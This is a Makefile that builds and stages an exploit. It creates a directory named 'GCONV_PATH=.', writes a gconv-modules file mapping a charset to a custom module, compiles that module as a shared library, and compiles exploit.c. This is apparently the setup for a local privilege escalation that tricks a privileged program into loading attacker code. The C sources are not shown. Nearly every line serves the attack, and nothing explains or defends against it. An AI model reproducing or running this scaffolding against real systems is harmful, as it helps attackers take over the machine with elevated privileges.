.DEFAULT_GOAL := all

all: clean prepare conversion_mod exploit

prepare:
	mkdir 'GCONV_PATH=.'
	touch GCONV_PATH=.\/incl
	chmod +x GCONV_PATH=.\/incl
	mkdir incl
	echo 'module  UTF-8//    NOTUTF8//    conversion-mod   1' > incl/gconv-modules

conversion_mod:
	gcc -shared -fPIC -o incl/conversion_mod.so conversion_mod.c

exploit:
	gcc -o exploit exploit.c

clean:
	rm -rf 'GCONV_PATH=.' incl exploit